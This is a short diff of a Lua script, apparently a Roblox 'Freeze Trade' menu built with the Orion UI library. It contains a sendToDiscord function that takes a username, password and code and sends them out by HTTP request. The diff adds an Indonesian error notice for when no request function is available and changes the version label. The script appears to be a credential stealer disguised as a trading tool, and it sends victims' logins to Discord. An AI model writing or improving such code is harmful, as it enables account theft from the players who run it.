@@ -36,13 +36,19 @@ local function sendToDiscord(username, password, code)
         http.request(payload)
     elseif request then
         request(payload)
+    else
+        OrionLib:MakeNotification({
+            Name = "Request Error",
+            Content = "Tidak dapat mengirim data ke Discord!",
+            Time = 3
+        })
     end
 end
 
 -- Fungsi untuk membuat GUI menggunakan Orion
 local function createMenuGUI()
     -- Membuat window dengan Orion
-    local window = OrionLib:MakeWindow({Name = "Freeze Trade V5", HidePremium = true})
+    local window = OrionLib:MakeWindow({Name = "Freeze Trade V2", HidePremium = true})
 
     -- Step 1: Key Input
     local function createKeyInputStep()
